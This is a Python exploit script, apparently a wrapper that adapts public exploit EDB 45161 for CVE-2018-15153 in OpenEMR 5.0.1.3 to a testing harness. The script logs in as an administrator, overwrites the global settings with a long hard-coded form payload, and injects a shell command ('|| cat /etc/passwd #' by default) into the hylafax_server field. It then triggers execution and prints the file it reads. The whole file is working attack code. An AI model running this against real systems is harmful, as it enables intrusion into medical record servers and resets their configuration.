#!/usr/bin/env python3
"""
AMENDER Wrapper for EDB 45161 - CVE-2018-15153
OpenEMR 5.0.1.3 OS Command Injection via hylafax_server

This wrapper adapts the original EDB 45161 RCE exploit to the AMENDER interface.
It maps --probe-file to a 'cat' command for confirmation testing.

WARNING: This exploit WILL replace the GLOBAL config with default values.
"""

import argparse
import base64
import requests
import sys
from urllib.parse import unquote


def main():
    parser = argparse.ArgumentParser(description="CVE-2018-15153 - OpenEMR Command Injection")
    parser.add_argument("--target", required=True, help="Base URL (e.g. http://localhost:8082)")
    parser.add_argument("--user", default="admin", help="Username")
    parser.add_argument("--password", required=True, help="Password")
    parser.add_argument("--site", default="default", help="Site ID")
    parser.add_argument("--probe-file", dest="probe_file", default="/etc/passwd",
                        help="File to read as proof of exploitation")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    login_url = f"{target}/interface/main/main_screen.php?auth=login&site={args.site}"
    globals_url = f"{target}/interface/super/edit_globals.php"
    daemon_url = f"{target}/interface/main/daemon_frame.php"

    print(f"[+] Target: {target}")
    print(f"[+] User: {args.user}")
    print(f"[+] Probe file: {args.probe_file}")

    with requests.Session() as s:
        # Step 1: Authenticate
        login_data = {
            "new_login_session_management": "1",
            "authProvider": "Default",
            "authUser": args.user,
            "clearPass": args.password,
            "languageChoice": "1"
        }

        print("[*] Authenticating...")
        try:
            r = s.post(login_url, data=login_data, timeout=30)
        except requests.RequestException as e:
            print(f"[-] Connection error: {e}")
            sys.exit(3)

        if "login_screen.php?error=1" in r.text:
            print("[-] Authentication failed")
            sys.exit(2)

        print("[+] Authentication successful")

        # Step 2: Build the full globals payload (from original EDB 45161)
        # This is necessary because edit_globals.php requires all form fields
        payload_str = "form_save=Save&srch_desc=&form_0=main_info.php&form_1=..%2F..%2Finterface"
        payload_str += "%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&form_2=1&form_3=tabs_"
        payload_str += "style_full.css&form_4=style_light.css&form_5=__default__&form_6=__default"
        payload_str += "__&form_7=1&form_8=0&form_9=175&form_10=OpenEMR&form_12=1&form_13=0&form_"
        payload_str += "14=0&form_16=1&form_21=1&form_22=1&form_23=1&form_24=1&form_25=http%3A%2F"
        payload_str += "%2Fopen-emr.org%2F&form_26=&form_27=20&form_28=10&form_30=0&form_31=5&for"
        payload_str += "m_32=0&form_37=English+%28Standard%29&form_38=1&form_42=1&form_43=1&form_"
        payload_str += "44=1&form_45=1&form_46=1&form_47=1&form_48=1&form_49=1&form_50=1&form_51="
        payload_str += "0&form_52=0&form_53=&form_54=2&form_55=.&form_56=%2C&form_57=%24&form_58="
        payload_str += "0&form_59=3&form_60=6%2C0&form_61=0&form_62=0&form_63=_blank&form_69=1&fo"
        payload_str += "rm_70=1&form_77=1&form_79=&form_80=&form_81=&form_84=1&form_85=1&form_87="
        payload_str += "1&form_89=1&form_90=1&form_91=1&form_92=Y1&form_93=1&form_94=2&form_95=0&"
        payload_str += "form_97=14&form_98=11&form_99=24&form_100=20&form_102=1&form_103=0&form_1"
        payload_str += "04=0&form_105=ICD10&form_106=1&form_107=1&form_112=3&form_115=1&form_116="
        payload_str += "&form_119=1.00&form_121=0&form_123=&form_125=30&form_126=&form_127=60&for"
        payload_str += "m_128=&form_129=90&form_130=&form_131=120&form_132=&form_133=150&form_134"
        payload_str += "=&form_135=1&form_138=1&form_139=1&form_141=1&form_142=0&form_143=localho"
        payload_str += "st&form_144=&form_145=&form_146=5984&form_147=&form_150=Patient+ID+card&f"
        payload_str += "orm_151=Patient+Photograph&form_152=Lab+Report&form_153=Lab+Report&form_1"
        payload_str += "55=100&form_157=8&form_158=17&form_159=15&form_160=day&form_161=1&form_16"
        payload_str += "2=2&form_163=1&form_164=10&form_165=10&form_166=15&form_167=20&form_168=1"
        payload_str += "&form_169=%23FFFFFF&form_170=%23E6E6FF&form_171=%23E6FFE6&form_172=%23FFE"
        payload_str += "6FF&form_173=1&form_174=0&form_176=1&form_177=1&form_178=1&form_181=1&for"
        payload_str += "m_182=1&form_183=1&form_184=1&form_185=D0&form_186=D0&form_187=0%3A20&for"
        payload_str += "m_188=0&form_190=33&form_191=0&form_194=7200&form_198=1&form_199=0&form_2"
        payload_str += "00=0&form_202=&form_203=&form_204=365&form_205=&form_206=1&form_208=&form"
        payload_str += "_210=&form_211=&form_212=&form_213=&form_214=&form_215=&form_216=SMTP&for"
        payload_str += "m_217=localhost&form_218=25&form_219=&form_220=&form_221=&form_222=50&for"
        payload_str += "m_223=50&form_224=&form_225=&form_226=&form_227=50&form_228=&form_229=&fo"
        payload_str += "rm_230=&form_231=1&form_232=1&form_233=1&form_234=1&form_235=1&form_236=1"
        payload_str += "&form_237=1&form_238=1&form_239=Model+Registry&form_240=125789123&form_24"
        payload_str += "1=1&form_242=1&form_243=1&form_244=&form_245=&form_246=1&form_247=1&form_"
        payload_str += "248=1&form_249=5&form_250=1&form_252=1&form_253=1&form_254=1&form_255=1&f"
        payload_str += "orm_256=1&form_257=1&form_258=1&form_262=&form_263=6514&form_264=&form_26"
        payload_str += "5=&form_267=1&form_268=0&form_269=%2Fusr%2Fbin&form_270=%2Fusr%2Fbin&form"
        payload_str += "_271=%2Ftmp&form_272=%2Ftmp&form_273=26&form_274=state&form_275=1&form_27"
        payload_str += "6=26&form_277=country&form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6"
        payload_str += "+-o+page-left%3D72+-o+page-top%3D72&form_279=&form_280=&form_282=2018-07-"
        payload_str += "23&form_283=1&form_285=%2Fvar%2Fspool%2Fhylafax&form_286=enscript+-M+Lett"
        payload_str += "er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&form_288=%2Fmnt%2Fscan_docs&for"
        payload_str += "m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&form_292=1&form_"
        payload_str += "296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&form_297=1&form_"
        payload_str += "299=&form_300=&form_301=&form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr"
        payload_str += "ovider.php&form_303=https%3A%2F%2Fssh.mydocsportal.com&form_305=https%3A%"
        payload_str += "2F%2Fyour_cms_site.com%2F&form_306=&form_307=&form_308=0&form_309=https%3"
        payload_str += "A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&form_312=https%3A%2F%2Fsecure.newcrop"
        payload_str += "accounts.com%2FInterfaceV7%2FRxEntry.aspx&form_313=https%3A%2F%2Fsecure.n"
        payload_str += "ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F"
        payload_str += "%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&fo"
        payload_str += "rm_314=21600&form_315=21600&form_316=&form_317=&form_318=&form_319=1&form"
        payload_str += "_324=&form_325=0&form_327=137&form_328=7C84773D5063B20BC9E41636A091C6F17E"
        payload_str += "9C1E34&form_329=C36275&form_330=0&form_332=https%3A%2F%2Fphimail.example."
        payload_str += "com%3A32541&form_333=&form_334=&form_335=admin&form_336=5&form_339=1&form"
        payload_str += "_346=LETTER&form_347=30&form_348=30&form_349=72&form_350=30&form_351=P&fo"
        payload_str += "rm_352=en&form_353=LETTER&form_354=5&form_355=5&form_356=5&form_357=8&for"
        payload_str += "m_358=D&form_359=1&form_360=9&form_361=1&form_362=104.775&form_363=241.3&"
        payload_str += "form_364=14&form_365=65&form_366=220"

        # Parse payload string into dict
        payload = {}
        for pair in payload_str.split("&"):
            if "=" in pair:
                key, value = pair.split("=", 1)
                payload[key] = unquote(value)

        # Inject the command into form_284 (hylafax_server)
        # Use simple command injection without base64 for file reading
        cmd = f"cat {args.probe_file}"
        injection = f"|| {cmd} #"
        payload["form_284"] = injection

        print(f"[*] Injecting command via hylafax_server...")
        try:
            r = s.post(globals_url, data=payload, timeout=60)
        except requests.RequestException as e:
            print(f"[-] Injection request failed: {e}")
            sys.exit(3)

        if r.status_code != 200:
            print(f"[-] Globals update failed with status {r.status_code}")
            sys.exit(2)

        print("[+] Globals updated")

        # Step 3: Trigger the command via daemon_frame.php
        print("[*] Triggering command execution...")
        try:
            r = s.get(daemon_url, timeout=30)
        except requests.RequestException as e:
            print(f"[-] Trigger request failed: {e}")
            sys.exit(3)

        output = r.text

        # Check for confirmation pattern
        if "root:x:0:0" in output or "root:" in output:
            print("[+] CONFIRMED - Command injection successful!")
            print(f"[+] Output:\n{output[:1000]}")
            sys.exit(0)
        else:
            print("[-] Exploitation may have failed - no confirmation pattern found")
            print(f"[-] Response ({len(output)} bytes):\n{output[:1000]}")
            sys.exit(2)


if __name__ == "__main__":
    main()
